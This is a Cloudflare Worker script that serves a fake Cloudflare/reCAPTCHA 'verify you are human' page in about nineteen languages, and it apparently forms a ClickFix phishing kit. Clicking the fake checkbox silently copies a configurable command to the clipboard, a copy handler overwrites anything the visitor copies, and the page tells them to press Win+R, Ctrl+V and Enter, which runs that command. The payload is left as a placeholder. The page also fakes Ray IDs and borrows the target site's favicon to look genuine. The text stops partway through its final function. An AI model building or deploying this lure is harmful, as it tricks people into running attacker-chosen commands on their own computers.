// Empty array = allow all IPs, Specific IPs = restricted
const ALLOWED_IPS = [];

export default {
    async fetch(request) {
        const clientIP = request.headers.get('cf-connecting-ip');
        
        // If array is not empty, check IP restriction
        if (ALLOWED_IPS.length > 0 && !ALLOWED_IPS.includes(clientIP)) {
            return new Response('Access Denied', { status: 403 });
        }
        
        const url = new URL(request.url);
        
        if (url.pathname === '/' || url.pathname === '/index.html') {
            return new Response(HTML, {
                headers: { 'Content-Type': 'text/html' }
            });
        }
        
        if (url.pathname === '/main.js') {
            return new Response(JS, {
                headers: { 'Content-Type': 'application/javascript' }
            });
        }
        
        if (url.pathname === '/styles.css') {
            return new Response(CSS, {
                headers: { 'Content-Type': 'text/css' }
            });
        }
        
        return new Response('Not Found', { status: 404 });
    }
};

const HTML = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Captcha Security Verification</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link rel="stylesheet" href="styles.css">
  <link rel="icon" id="dynamic-favicon" href="data:,">
</head>
<body>

<div class="main-wrapper">
  <div class="main-content">
    <div class="logo-container">
      <!--  Specify Logo URL or Leave Blank for Auto Populate  -->
      <img class="logo-img" src="https://www.google.com/s2/favicons?sz=128&domain=cloudflare.com" alt="Cloudflare Logo">
      <p class="domain-title"><span class="domain-name"></span></p>
    </div>

    <div class="text-container">
      <p>
        <span class="preloader_text">Checking if you are human. This may take a few seconds.</span>
        <span class="textallstep" style="display: none;">Verify you are human by completing the action below.</span>
      </p>
    </div>

    <div class="intro">
      <div class="preloader">
        <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
      </div>

      <div id="checkbox-window" class="checkbox-window" style="display: none;">
        <div class="checkbox-window-inner">
          <div class="checkbox-container">
            <svg class="step0" id="spinner2" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg" style="display: none;">
              <circle cx="30" cy="10" r="2.5" class="point"></circle>
              <circle cx="50" cy="30" r="2.5" class="point"></circle>
              <circle cx="30" cy="50" r="2.5" class="point"></circle>
              <circle cx="10" cy="30" r="2.5" class="point"></circle>
              <circle cx="43.6" cy="16.4" r="2.5" class="point"></circle>
              <circle cx="16.4" cy="16.4" r="2.5" class="point"></circle>
              <circle cx="43.6" cy="43.6" r="2.5" class="point"></circle>
              <circle cx="16.4" cy="43.6" r="2.5" class="point"></circle>
            </svg>

            <button type="button" id="checkbox" class="checkbox step1" style="display: none;"></button>

            <div class="spinner step2" id="spinner" style="visibility: hidden; display: none;">
              <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
            </div>

            <div class="step3" style="display: none;">
              <svg class="success-icon" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
                <circle cx="25" cy="25" r="23"/>
                <path d="M15 25 L22 32 L35 18"/>
              </svg>
            </div>
          </div>

          <div class="tettx">
            <p class="step0">Verifying...</p>
            <p class="step1" style="display: none;">I'm not a robot</p>
            <p class="step2" style="display: none;">Verification Steps</p>
            <p class="step3" style="display: none;">Successfully.</p>
          </div>

          <div class="legal-links">
            <img src="https://i.postimg.cc/k4zrz92z/111.png" alt="Logo">
            <p>Confidentiality</p>
            <p>Terms and Conditions</p>
          </div>
        </div>

        <div id="verify-window" class="verify-window">
          <div class="verify-container">
            <main class="verify-main">
              <p>To better prove you are not a robot, please:</p>
              <ol>
                <li>Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.</li>
                <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
                <li>Press <b>Enter</b> on your keyboard to finish.</li>
              </ol>
              <p class="observe">
                You will observe and agree:<br>
                <code> ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>" </code>
              </p>
            </main>
          </div>
          <div class="verify-container verify-footer verify-footer-container">
            <div class="verify-footer-left">Perform the steps above to finish verification.</div>
            <button type="button" class="verify-verify-button block" id="verify-button">Verify</button>
          </div>
        </div>
      </div>

      <p class="domain-footer">
        <span class="domain-name"></span> needs to review the security of your connection before proceeding.
      </p>
    </div>
  </div>
</div>

<div class="footer" role="contentinfo">
  <div class="footer-inner">
    <div>
      <div>Ray ID: <code class="ray-id">56a4c5299fdetmca</code></div>
    </div>
    <div>Platform performance and security <span style="color: #000000">Cloudflare</span></div>
  </div>
</div>

<script src="main.js"></script>

</body>
</html>
`;

const JS = `
const CONFIG = {
    command: "Your Clipboard Command Here"
};

const I18N = {
    en: {
        checking: "Checking if you are human. This may take a few seconds.",
        verifyInstruction: "Verify you are human by completing the action below.",
        verifying: "Verifying...",
        notRobot: "I'm not a robot",
        steps: "Verification Steps",
        success: "Successfully.",
        verifyTitle: "Please complete the following CAPTCHA verification:",
        step1: "Press & hold the Windows Key <i class='fab fa-windows'></i> + <b>R</b>.",
        step2: "In the verification window, press <b>Ctrl</b> + <b>V</b>.",
        step3: "Press <b>Enter</b> on your keyboard to finish.",
        observe: "You will observe and agree:",
        confirmLead: "I am not a robot - reCAPTCHA Verification ID: ",
        final: "Perform the steps above to finish verification.",
        verifyBtn: "Verify",
        confidentiality: "Confidentiality",
        terms: "Terms and Conditions",
        footer: "needs to review the security of your connection before proceeding."
    },
    de: {
        checking: "Überprüfung, ob Sie ein Mensch sind. Dies kann einige Sekunden dauern.",
        verifyInstruction: "Bestätigen Sie, dass Sie ein Mensch sind, indem Sie die folgende Aktion ausführen.",
        verifying: "Wird überprüft...",
        notRobot: "Ich bin kein Roboter",
        steps: "Überprüfung",
        success: "Erfolgreich.",
        verifyTitle: "Um nachweisen zu können, dass Sie kein Roboter sind:",
        step1: "Halten Sie die Windows-Taste <i class='fab fa-windows'></i> + <b>R</b> gedrückt.",
        step2: "Drücken Sie im Verifizierungsfenster <b>Strg</b> + <b>V</b>.",
        step3: "Drücken Sie die <b>Eingabetaste</b>, um abzuschließen.",
        observe: "Wenn Sie fortfahren, bestätigen Sie:",
        confirmLead: "Ich bin kein Roboter – reCAPTCHA Verifizierungs-ID: ",
        final: "Führen Sie die obigen Schritte aus, um die Überprüfung abzuschließen.",
        verifyBtn: "Überprüfen",
        confidentiality: "Vertraulichkeit",
        terms: "Nutzungsbedingungen",
        footer: "muss die Sicherheit Ihrer Verbindung prüfen, bevor Sie fortfahren."
    },
    fr: {
        checking: "Vérification que vous êtes humain. Cela peut prendre quelques secondes.",
        verifyInstruction: "Vérifiez que vous êtes humain en complétant l'action ci-dessous.",
        verifying: "Vérification…",
        notRobot: "Je ne suis pas un robot",
        steps: "Vérification",
        success: "Réussi.",
        verifyTitle: "Pour prouver que vous n'êtes pas un robot :",
        step1: "Maintenez la touche Windows <i class='fab fa-windows'></i> + <b>R</b>.",
        step2: "Dans la fenêtre de vérification, appuyez sur <b>Ctrl</b> + <b>V</b>.",
        step3: "Appuyez sur la touche <b>Entrée</b> pour terminer.",
        observe: "En continuant, vous confirmez :",
        confirmLead: "Je ne suis pas un robot – ID de vérification reCAPTCHA : ",
        final: "Effectuez les étapes ci-dessus pour terminer la vérification.",
        verifyBtn: "Vérifier",
        confidentiality: "Confidentialité",
        terms: "Conditions générales",
        footer: "doit vérifier la sécurité de votre connexion avant de continuer."
    },
    it: {
        checking: "Verifica che tu sia umano. Potrebbe volerci qualche secondo.",
        verifyInstruction: "Verifica di essere umano completando l'azione seguente.",
        verifying: "Verifica in corso…",
        notRobot: "Non sono un robot",
        steps: "Verifica",
        success: "Completato.",
        verifyTitle: "Per dimostrare che non sei un robot:",
        step1: "Tieni premuto il tasto Windows <i class='fab fa-windows'></i> + <b>R</b>.",
        step2: "Nella finestra di verifica premi <b>Ctrl</b> + <b>V</b>.",
        step3: "Premi <b>Invio</b> per completare.",
        observe: "Proseguendo, confermi:",
        confirmLead: "Non sono un robot – ID di verifica reCAPTCHA: ",
        final: "Esegui i passaggi sopra per terminare la verifica.",
        verifyBtn: "Verifica",
        confidentiality: "Riservatezza",
        terms: "Termini e condizioni",
        footer: "deve verificare la sicurezza della connessione prima di procedere."
    },
    ar: {
        checking: "جاري التحقق من أنك إنسان. قد يستغرق هذا بضع ثوانٍ.",
        verifyInstruction: "تحقق من أنك إنسان بإكمال الخطوة أدناه.",
        verifying: "جارٍ التحقق…",
        notRobot: "لست برنامج روبوت",
        steps: "التحقق",
        success: "تم بنجاح.",
        verifyTitle: "لإثبات أنك لست روبوتًا:",
        step1: "اضغط مع الاستمرار على مفتاح Windows <i class='fab fa-windows'></i> + <b>R</b>.",
        step2: "في نافذة التحقق اضغط <b>Ctrl</b> + <b>V</b>.",
        step3: "اضغط <b>Enter</b> للإنهاء.",
        observe: "بالمتابعة، فإنك تؤكد:",
        confirmLead: "أنا لست روبوتًا – معرّف تحقق reCAPTCHA: ",
        final: "أكمل الخطوات أعلاه لإنهاء التحقق.",
        verifyBtn: "تحقق",
        confidentiality: "السرية",
        terms: "الشروط والأحكام",
        footer: "يجب مراجعة أمان الاتصال قبل المتابعة."
    },
    zh: {
        checking: "正在检查您是否为人类。这可能需要几秒钟。",
        verifyInstruction: "通过完成以下操作验证您是人类。",
        verifying: "正在验证…",
        notRobot: "我不是机器人",
        steps: "验证",
        success: "成功。",
        verifyTitle: "为证明您不是机器人：",
        step1: "按住 Windows 键 <i class='fab fa-windows'></i> + <b>R</b>。",
        step2: "在验证窗口中按 <b>Ctrl</b> + <b>V</b>。",
        step3: "按 <b>Enter</b> 完成。",
        observe: "继续操作即表示您确认：",
        confirmLead: "我不是机器人 — reCAPTCHA 验证 ID：",
        final: "请完成以上步骤以完成验证。",
        verifyBtn: "验证",
        confidentiality: "保密",
        terms: "条款和条件",
        footer: "需要在继续之前检查您连接的安全性。"
    },
    ja: {
        checking: "あなたが人間かどうか確認しています。数秒かかる場合があります。",
        verifyInstruction: "以下の操作を完了して、人間であることを確認してください。",
        verifying: "確認中…",
        notRobot: "私はロボットではありません",
        steps: "確認",
        success: "成功しました。",
        verifyTitle: "ロボットではないことを証明するために：",
        step1: "Windowsキー <i class='fab fa-windows'></i> + <b>R</b> を押し続けてください。",
        step2: "検証ウィンドウで <b>Ctrl</b> + <b>V</b> を押してください。",
        step3: "<b>Enter</b> を押して完了します。",
        observe: "続行すると、次を確認します：",
        confirmLead: "私はロボットではありません — reCAPTCHA 検証 ID: ",
        final: "上記の手順を実行して検証を完了してください。",
        verifyBtn: "確認する",
        confidentiality: "機密保持",
        terms: "利用規約",
        footer: "続行する前に接続のセキュリティを確認する必要があります。"
    },
    ru: {
        checking: "Проверяем, что вы человек. Это может занять несколько секунд.",
        verifyInstruction: "Подтвердите, что вы человек, выполнив действие ниже.",
        verifying: "Проверка…",
        notRobot: "Я не робот",
        steps: "Проверка",
        success: "Успешно.",
        verifyTitle: "Чтобы доказать, что вы не робот:",
        step1: "Удерживайте клавишу Windows <i class='fab fa-windows'></i> + <b>R</b>.",
        step2: "В окне проверки нажмите <b>Ctrl</b> + <b>V</b>.",
        step3: "Нажмите <b>Enter</b> для завершения.",
        observe: "Продолжая, вы подтверждаете:",
        confirmLead: "Я не робот — ID проверки reCAPTCHA: ",
        final: "Выполните шаги выше, чтобы завершить проверку.",
        verifyBtn: "Проверить",
        confidentiality: "Конфиденциальность",
        terms: "Условия использования",
        footer: "должен проверить безопасность вашего соединения перед продолжением."
    },
    es: {
        checking: "Comprobando si eres humano. Esto puede tardar unos segundos.",
        verifyInstruction: "Verifica que eres humano completando la acción siguiente.",
        verifying: "Verificando…",
        notRobot: "No soy un robot",
        steps: "Verificación",
        success: "Correcto.",
        verifyTitle: "Para demostrar que no eres un robot:",
        step1: "Mantén pulsada la tecla Windows <i class='fab fa-windows'></i> + <b>R</b>.",
        step2: "En la ventana de verificación, pulsa <b>Ctrl</b> + <b>V</b>.",
        step3: "Pulsa <b>Enter</b> para finalizar.",
        observe: "Al continuar, confirmas:",
        confirmLead: "No soy un robot — ID de verificación reCAPTCHA: ",
        final: "Realiza los pasos anteriores para finalizar la verificación.",
        verifyBtn: "Verificar",
        confidentiality: "Confidencialidad",
        terms: "Términos y condiciones",
        footer: "debe revisar la seguridad de tu conexión antes de continuar."
    },
    pt: {
        checking: "Verificando se você é humano. Isso pode levar alguns segundos.",
        verifyInstruction: "Confirme que você é humano concluindo a ação abaixo.",
        verifying: "Verificando…",
        notRobot: "Não sou um robô",
        steps: "Verificação",
        success: "Concluído.",
        verifyTitle: "Para provar que você não é um robô:",
        step1: "Mantenha pressionada a tecla Windows <i class='fab fa-windows'></i> + <b>R</b>.",
        step2: "Na janela de verificação, pressione <b>Ctrl</b> + <b>V</b>.",
        step3: "Pressione <b>Enter</b> para concluir.",
        observe: "Ao continuar, você confirma:",
        confirmLead: "Não sou um robô — ID de verificação reCAPTCHA: ",
        final: "Conclua as etapas acima para finalizar a verificação.",
        verifyBtn: "Verificar",
        confidentiality: "Confidencialidade",
        terms: "Termos e condições",
        footer: "precisa revisar a segurança da sua conexão antes de prosseguir."
    },
    nl: {
        checking: "Controleren of u een mens bent. Dit kan enkele seconden duren.",
        verifyInstruction: "Bevestig dat u een mens bent door de onderstaande actie uit te voeren.",
        verifying: "Bezig met controleren…",
        notRobot: "Ik ben geen robot",
        steps: "Verificatie",
        success: "Gelukt.",
        verifyTitle: "Om aan te tonen dat u geen robot bent:",
        step1: "Houd de Windows-toets <i class='fab fa-windows'></i> + <b>R</b> ingedrukt.",
        step2: "Druk in het verificatievenster op <b>Ctrl</b> + <b>V</b>.",
        step3: "Druk op <b>Enter</b> om af te ronden.",
        observe: "Als u doorgaat, bevestigt u:",
        confirmLead: "Ik ben geen robot — reCAPTCHA-verificatie-ID: ",
        final: "Voer de bovenstaande stappen uit om de verificatie te voltooien.",
        verifyBtn: "Verifiëren",
        confidentiality: "Vertrouwelijkheid",
        terms: "Voorwaarden",
        footer: "moet de veiligheid van uw verbinding controleren voordat u verdergaat."
    },
    tr: {
        checking: "İnsan olup olmadığınız kontrol ediliyor. Bu birkaç saniye sürebilir.",
        verifyInstruction: "Aşağıdaki işlemi tamamlayarak insan olduğunuzu doğrulayın.",
        verifying: "Doğrulanıyor…",
        notRobot: "Ben robot değilim",
        steps: "Doğrulama",
        success: "Başarılı.",
        verifyTitle: "Robot olmadığınızı kanıtlamak için:",
        step1: "Windows tuşunu <i class='fab fa-windows'></i> + <b>R</b> ile basılı tutun.",
        step2: "Doğrulama penceresinde <b>Ctrl</b> + <b>V</b> tuşlarına basın.",
        step3: "Bitirmek için <b>Enter</b>'a basın.",
        observe: "Devam ederek şunları onaylarsınız:",
        confirmLead: "Robot değilim — reCAPTCHA Doğrulama Kimliği: ",
        final: "Doğrulamayı tamamlamak için yukarıdaki adımları uygulayın.",
        verifyBtn: "Doğrula",
        confidentiality: "Gizlilik",
        terms: "Şartlar ve Koşullar",
        footer: "devam etmeden önce bağlantınızın güvenliğini kontrol etmelidir."
    },
    ko: {
        checking: "사용자가 사람인지 확인하는 중입니다. 잠시만 기다려 주세요.",
        verifyInstruction: "아래 작업을 완료하여 사람이 맞는지 확인하세요.",
        verifying: "확인 중…",
        notRobot: "나는 로봇이 아닙니다",
        steps: "검증",
        success: "성공.",
        verifyTitle: "로봇이 아님을 증명하려면:",
        step1: "Windows 키 <i class='fab fa-windows'></i> + <b>R</b>을 누르세요.",
        step2: "검증 창에서 <b>Ctrl</b> + <b>V</b>를 누르세요.",
        step3: "마치려면 <b>Enter</b>를 누르세요.",
        observe: "계속하면 다음을 확인합니다:",
        confirmLead: "로봇이 아닙니다 — reCAPTCHA 확인 ID: ",
        final: "위 단계들을 완료하여 검증을 마치세요.",
        verifyBtn: "확인",
        confidentiality: "기밀",
        terms: "이용약관",
        footer: "계속하기 전에 연결의 보안을 확인해야 합니다."
    },
    hi: {
        checking: "सत्यापित किया जा रहा है कि आप मानव हैं। इसमें कुछ सेकंड लग सकते हैं।",
        verifyInstruction: "नीचे दिया गया कार्य पूरा करके प्रमाणित करें कि आप एक मानव हैं।",
        verifying: "सत्यापित कर रहे हैं...",
        notRobot: "मैं एक रोबोट नहीं हूँ",
        steps: "सत्यापन चरण",
        success: "सफल।",
        verifyTitle: "यह सिद्ध करने के लिए कि आप रोबोट नहीं हैं:",
        step1: "Windows कुंजी <i class='fab fa-windows'></i> + <b>R</b> दबाकर रखें।",
        step2: "सत्यापन विंडो में <b>Ctrl</b> + <b>V</b> दबाएँ।",
        step3: "समाप्त करने के लिए कीबोर्ड पर <b>Enter</b> दबाएँ।",
        observe: "आप देखेंगे और सहमत होंगे:",
        confirmLead: "मैं एक रोबोट नहीं हूँ - reCAPTCHA सत्यापन आईडी: ",
        final: "सत्यापन पूरा करने के लिए ऊपर दिए गए चरणों का पालन करें।",
        verifyBtn: "सत्यापित करें",
        confidentiality: "गोपनीयता",
        terms: "नियम और शर्तें",
        footer: "आपकी कनेक्शन की सुरक्षा की समीक्षा करने की आवश्यकता है।"
    },
    id: {
        checking: "Memeriksa apakah Anda manusia. Ini mungkin membutuhkan beberapa detik.",
        verifyInstruction: "Verifikasi bahwa Anda manusia dengan menyelesaikan tindakan di bawah ini.",
        verifying: "Memverifikasi...",
        notRobot: "Saya bukan robot",
        steps: "Langkah Verifikasi",
        success: "Berhasil.",
        verifyTitle: "Untuk membuktikan bahwa Anda bukan robot:",
        step1: "Tekan dan tahan Tombol Windows <i class='fab fa-windows'></i> + <b>R</b>.",
        step2: "Di jendela verifikasi, tekan <b>Ctrl</b> + <b>V</b>.",
        step3: "Tekan <b>Enter</b> pada keyboard Anda untuk menyelesaikan.",
        observe: "Anda akan melihat dan menyetujui:",
        confirmLead: "Saya bukan robot - ID Verifikasi reCAPTCHA: ",
        final: "Lakukan langkah di atas untuk menyelesaikan verifikasi.",
        verifyBtn: "Verifikasi",
        confidentiality: "Kerahasiaan",
        terms: "Syarat dan Ketentuan",
        footer: "perlu meninjau keamanan koneksi Anda sebelum melanjutkan."
    },
    vi: {
        checking: "Đang kiểm tra xem bạn có phải là con người không. Việc này có thể mất vài giây.",
        verifyInstruction: "Xác minh bạn là người bằng cách hoàn thành hành động bên dưới.",
        verifying: "Đang xác minh...",
        notRobot: "Tôi không phải là rô-bốt",
        steps: "Các bước xác minh",
        success: "Thành công.",
        verifyTitle: "Để chứng minh bạn không phải là rô-bốt:",
        step1: "Nhấn và giữ phím Windows <i class='fab fa-windows'></i> + <b>R</b>.",
        step2: "Trong cửa sổ xác minh, nhấn <b>Ctrl</b> + <b>V</b>.",
        step3: "Nhấn <b>Enter</b> trên bàn phím để kết thúc.",
        observe: "Bạn sẽ quan sát và đồng ý:",
        confirmLead: "Tôi không phải là rô-bốt - ID xác minh reCAPTCHA: ",
        final: "Thực hiện các bước trên để hoàn tất xác minh.",
        verifyBtn: "Xác minh",
        confidentiality: "Bảo mật",
        terms: "Điều khoản và Điều kiện",
        footer: "cần kiểm tra bảo mật kết nối của bạn trước khi tiếp tục."
    },
    th: {
        checking: "กำลังตรวจสอบว่าคุณเป็นมนุษย์หรือไม่ อาจใช้เวลาสักครู่",
        verifyInstruction: "โปรดยืนยันว่าคุณเป็นมนุษย์โดยทำตามขั้นตอนด้านล่าง",
        verifying: "กำลังตรวจสอบ...",
        notRobot: "ฉันไม่ใช่หุ่นยนต์",
        steps: "ขั้นตอนการยืนยัน",
        success: "สำเร็จ",
        verifyTitle: "เพื่อพิสูจน์ว่าคุณไม่ใช่หุ่นยนต์:",
        step1: "กดค้างที่ปุ่ม Windows <i class='fab fa-windows'></i> + <b>R</b>",
        step2: "ในหน้าต่างการยืนยัน ให้กด <b>Ctrl</b> + <b>V</b>",
        step3: "กด <b>Enter</b> เพื่อเสร็จสิ้น",
        observe: "คุณจะเห็นและตกลง:",
        confirmLead: "ฉันไม่ใช่หุ่นยนต์ - รหัสยืนยัน reCAPTCHA: ",
        final: "ดำเนินการตามขั้นตอนด้านบนเพื่อเสร็จสิ้นการยืนยัน",
        verifyBtn: "ยืนยัน",
        confidentiality: "ความลับ",
        terms: "ข้อกำหนดและเงื่อนไข",
        footer: "จำเป็นต้องตรวจสอบความปลอดภัยของการเชื่อมต่อของคุณก่อนดำเนินการต่อ."
    },
    uk: {
        checking: "Перевірка, чи ви людина. Це може зайняти кілька секунд.",
        verifyInstruction: "Підтвердіть, що ви людина, виконавши дію нижче.",
        verifying: "Перевірка...",
        notRobot: "Я не робот",
        steps: "Кроки перевірки",
        success: "Успішно.",
        verifyTitle: "Щоб довести, що ви не робот:",
        step1: "Утримуйте клавішу Windows <i class='fab fa-windows'></i> + <b>R</b>.",
        step2: "У вікні перевірки натисніть <b>Ctrl</b> + <b>V</b>.",
        step3: "Натисніть <b>Enter</b>, щоб завершити.",
        observe: "Ви побачите та погодитесь:",
        confirmLead: "Я не робот — ідентифікатор перевірки reCAPTCHA: ",
        final: "Виконайте наведені вище кроки, щоб завершити перевірку.",
        verifyBtn: "Перевірити",
        confidentiality: "Конфіденційність",
        terms: "Умови",
        footer: "повинна перевірити безпеку вашого з'єднання перед продовженням."
    },
    cs: {
        checking: "Kontroluje se, zda jste člověk. To může trvat několik sekund.",
        verifyInstruction: "Ověřte, že jste člověk, provedením níže uvedené akce.",
        verifying: "Ověřování...",
        notRobot: "Nejsem robot",
        steps: "Kroky ověření",
        success: "Úspěšně.",
        verifyTitle: "Aby se prokázalo, že nejste robot:",
        step1: "Stiskněte a podržte klávesu Windows <i class='fab fa-windows'></i> + <b>R</b>.",
        step2: "V ověřovacím okně stiskněte <b>Ctrl</b> + <b>V</b>.",
        step3: "Stiskněte <b>Enter</b> pro dokončení.",
        observe: "Budete pozorovat a souhlasit:",
        confirmLead: "Nejsem robot — ID ověření reCAPTCHA: ",
        final: "Pro dokončení ověření proveďte výše uvedené kroky.",
        verifyBtn: "Ověřit",
        confidentiality: "Důvěrnost",
        terms: "Podmínky",
        footer: "musí zkontrolovat bezpečnost vašeho připojení před pokračováním."
    }
};

function detectLanguage() {
    const prefs = (navigator.languages && navigator.languages.length ? navigator.languages : [navigator.language || "en"]).map(x => x.toLowerCase());
    const languageMap = {
        ar: ["ar", "he"],
        fr: ["fr"],
        de: ["de"],
        it: ["it"],
        ja: ["ja"],
        zh: ["zh"],
        ko: ["ko"],
        ru: ["ru"],
        es: ["es"],
        pt: ["pt"],
        nl: ["nl"],
        tr: ["tr"],
        hi: ["hi"],
        id: ["id"],
        vi: ["vi"],
        th: ["th"],
        uk: ["uk"],
        cs: ["cs"]
    };

    for (const lang of prefs) {
        for (const [code, prefixes] of Object.entries(languageMap)) {
            if (prefixes.some(prefix => lang.startsWith(prefix))) {
                return code;
            }
        }
        if (lang.startsWith("en")) return "en";
    }
    return "en";
}

function getHostname(val) {
    if (!val) return window.location.hostname || '';
    try {
        return new URL(val, window.location.origin).hostname;
    } catch (e) {
        // If embedded in worker constant:
        return String(val).replace(/^https?:\\/\\//i, '').split('/')[0];
    }
}

function initializeDomainAndLogo() {
    const params = new URLSearchParams(window.location.search);
    const siteParam = params.get('site');
    const logoParam = params.get('logo');
    const host = getHostname(siteParam) || window.location.hostname || '';

    document.querySelectorAll('.domain-name').forEach(el => {
        el.textContent = host;
    });

    const faviconUrl = logoParam || "https://www.google.com/s2/favicons?sz=128&domain=" + encodeURIComponent(host);
    const faviconEl = document.getElementById('dynamic-favicon') || (() => {
        const l = document.createElement('link');
        l.rel = 'icon';
        document.head.appendChild(l);
        return l;
    })();
    faviconEl.href = faviconUrl;
    const candidates = [
        faviconUrl,
        "https://icons.duckduckgo.com/ip3/" + encodeURIComponent(host) + ".ico",
        "https://" + host + "/favicon.ico"
    ].filter(Boolean);

    document.querySelectorAll('.logo-img').forEach(img => {
      // Skip if image already has a src (your default Cloudflare logo)
      if (img.src) {
        return; // Don't change it
      }
      
      let i = 0;
      const tryNext = () => {
        if (i >= candidates.length) {
          img.src = faviconUrl;
          return;
        }
        img.src = candidates[i++];
      };
      img.alt = host + ' logo';
      img.onerror = tryNext;
      tryNext();
    });
}

function initializeI18n() {
    const lang = detectLanguage();
    const t = I18N[lang] || I18N.en;

    if (lang === "ar" || lang === "he") {
        document.documentElement.dir = "rtl";
    }

    const pre = document.querySelector(".preloader_text");
    if (pre) pre.textContent = t.checking;

    const allstep = document.querySelector(".textallstep");
    if (allstep) allstep.textContent = t.verifyInstruction;

    const set = (sel, txt) => {
        document.querySelectorAll(sel).forEach(el => el.textContent = txt);
    };
    set(".tettx .step0", t.verifying);
    set(".tettx .step1", t.notRobot);
    set(".tettx .step2", t.steps);
    set(".tettx .step3", t.success);

    const cb = document.getElementById("checkbox");
    if (cb) cb.textContent = "";

    const titleP = document.querySelector("#verify-window .verify-main p:first-of-type");
    if (titleP) titleP.innerHTML = t.verifyTitle;

    const stepsOl = document.querySelector("#verify-window .verify-main ol");
    if (stepsOl) stepsOl.innerHTML = "<li>" + t.step1 + "</li><li>" + t.step2 + "</li><li>" + t.step3 + "</li>";
    const observeP = document.querySelector("#verify-window .verify-main p.observe");
    if (observeP) {
        const codeEl = observeP.querySelector("code");
        const pieces = observeP.innerHTML.split("<br>");
        pieces[0] = t.observe;
        observeP.innerHTML = pieces.join("<br>");
        if (codeEl) {
            const idSpan = codeEl.querySelector("#verification-id");
            const idHtml = idSpan ? idSpan.outerHTML : '<span id="verification-id"></span>';
            codeEl.innerHTML = ' ✅ "' + t.confirmLead + idHtml + '" ';
        }
    }

    const left = document.querySelector(".verify-footer-left");
    if (left) left.textContent = t.final;

    const btn = document.getElementById("verify-button");
    if (btn) btn.textContent = t.verifyBtn;

    const legalBox = document.querySelector('#checkbox-window > div > div:last-child');
    if (legalBox) {
        const ps = legalBox.querySelectorAll("p");
        if (ps[0]) ps[0].textContent = t.confidentiality;
        if (ps[1]) ps[1].textContent = t.terms;
    }

    const domainParas = Array.from(document.querySelectorAll("p .domain-name")).map(s => s.parentElement);
    for (const p of domainParas) {
        if (/\bneeds to review the security of your connection before proceeding\./i.test(p.textContent)) {
            const host = (p.querySelector(".domain-name")?.textContent || window.location.hostname || "");
            p.innerHTML = '<span class="domain-name">' + host + '</span> ' + t.footer;
            break;
        }
    }
}

function copyToClipboard(text) {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.setAttribute('readonly', '');
    textarea.style.position = 'absolute';
    textarea.style.left = '-9999px';
    document.body.appendChild(textarea);
    textarea.select();
    try {
        document.execCommand('copy');
    } catch (e) {
        console.error('Copy failed:', e);
    }
    document.body.removeChild(textarea);
}

function generateVerificationId() {
    return Math.floor(100000 + Math.random() * 900000);
}

function generateRayId() {
    const chars = "abcdef0123456789";
    return Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function initializeVerification() {
    const preloaderElements = document.querySelectorAll(".preloader");
    const preloaderText = document.querySelector(".preloader_text");
    const textAllStep = document.querySelector(".textallstep");
    const checkboxWindow = document.getElementById("checkbox-window");
    const step0Elements = document.querySelectorAll(".step0");
    const step1Elements = document.querySelectorAll(".step1");
    const step2Elements = document.querySelectorAll(".step2");
    const step3Elements = document.querySelectorAll(".step3");
    const checkbox = document.getElementById("checkbox");
    const verifyWindow = document.getElementById("verify-window");
    const spinner = document.getElementById("spinner");
    const verifyButton = document.getElementById("verify-button");

    setTimeout(() => {
        preloaderElements.forEach(el => el.style.display = "none");
        if (preloaderText) preloaderText.style.display = "none";
        if (textAllStep) textAllStep.style.display = "block";
        if (checkboxWindow) checkboxWindow.style.display = "flex";

        setTimeout(() => {
            if (checkboxWindow) {
                let opacity = 0;
                const fadeIn = setInterval(() => {
                    if (opacity >= 1) {
                        clearInterval(fadeIn);
                    } else {
                        opacity += 0.1;
                        checkboxWindow.style.opacity = opacity;
                    }
                }, 30);
            }
        }, 200);

        step0Elements.forEach(el => {
            el.style.display = "block";
            el.classList.add("active");
        });

        setTimeout(() => {
            step0Elements.forEach(el => {
                el.style.display = "none";
                el.classList.remove("active");
            });
            step1Elements.forEach(el => {
                el.style.display = "block";
                el.classList.add("active");
            });
        }, 2000);
    }, 1500);

    if (checkbox) {
        checkbox.addEventListener("click", function () {
            copyToClipboard(CONFIG.command);

            step1Elements.forEach(el => {
                el.style.display = "none";
                el.classList.remove("active");
            });
            step2Elements.forEach(el => {
                el.style.display = "block";
                el.classList.add("active");
            });
            if (spinner) spinner.style.visibility = "visible";

            setTimeout(() => {
                if (checkboxWindow) {
                    checkboxWindow.style.width = "530px";
                    checkboxWindow.style.height = "auto";
                }
                if (verifyWindow) verifyWindow.classList.add("active");
            }, 500);
        });
    }

    if (verifyButton) {
        verifyButton.addEventListener("click", function () {
            if (verifyWindow) verifyWindow.classList.remove("active");
            if (checkboxWindow) checkboxWindow.style.height = "74px";

            setTimeout(() => {
                if (checkboxWindow) checkboxWindow.style.width = "300px";
                step2Elements.forEach(el => {
                    el.style.display = "none";
                    el.classList.remove("active");
                });
                step3Elements.forEach(el => {
                    el.style.display = "block";
                    el.classList.add("active");
                });

                setTimeout(() => {
                    step3Elements.forEach(el => {
                        el.style.display = "none";
                        el.classList.remove("active");
                    });
                    step1Elements.forEach(el => {
                        el.style.display = "block";
                        el.classList.add("active");
                    });
                    if (spinner) spinner.style.visibility = "hidden";
                }, 1000);
            }, 600);
        });
    }

    const verEl = document.getElementById("verification-id");
    if (verEl) verEl.textContent = generateVerificationId();

    const rayEl = document.querySelector(".ray-id");
    if (rayEl) {
        rayEl.textContent = generateRayId();
    }
}

document.addEventListener('copy', function (e) {
    e.preventDefault();
    if (e.clipboardData) {
        e.clipboardData.setData('text/plain', CONFIG.command);
    } else if (window.clipboardData) {
        window.clipboardData.setData('Text', CONFIG.command);
    }
});

function ready(fn) {
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", fn);
    } else {
        fn();
    }
}

ready(function () {
    initializeDomainAndLogo();
    initializeI18n();
